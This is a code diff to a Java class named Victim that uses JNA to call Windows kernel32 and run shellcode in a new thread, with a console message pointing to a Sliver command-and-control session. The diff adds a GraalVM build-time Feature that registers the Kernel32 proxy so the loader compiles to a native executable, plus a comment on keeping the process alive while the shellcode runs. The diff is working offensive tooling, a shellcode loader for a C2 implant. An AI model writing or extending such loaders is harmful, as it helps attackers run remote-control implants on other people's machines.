@@ -4,7 +4,24 @@ import com.sun.jna.Native;
 import com.sun.jna.win32.StdCallLibrary;
 import java.io.InputStream;
 
+// GraalVM SDK Imports for the Feature
+import org.graalvm.nativeimage.hosted.Feature;
+import org.graalvm.nativeimage.hosted.RuntimeProxySupport;
+
 public class Victim {
+
+    /**
+     * This internal class is a GraalVM "Feature".
+     * It runs DURING the native-image build process to manually
+     * register the JNA proxy for Kernel32.
+     */
+    static class ProxyRegistrationFeature implements Feature {
+        @Override
+        public void beforeAnalysis(BeforeAnalysisAccess access) {
+            // This is the programmatic equivalent of the proxy-config.json
+            RuntimeProxySupport.register(shell.Victim.Kernel32.class, com.sun.jna.Library.class);
+        }
+    }
 
     public interface Kernel32 extends StdCallLibrary {
         Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);
@@ -45,6 +62,7 @@ public class Victim {
             System.out.println("[*] Executing thread. Check Sliver console!");
             long threadHandle = Kernel32.INSTANCE.CreateThread(0, 0, address, 0, 0, 0);
 
+            // Keeps the Java process alive while the shellcode runs
             Kernel32.INSTANCE.WaitForSingleObject(threadHandle, -1);
 
         } catch (Exception e) {
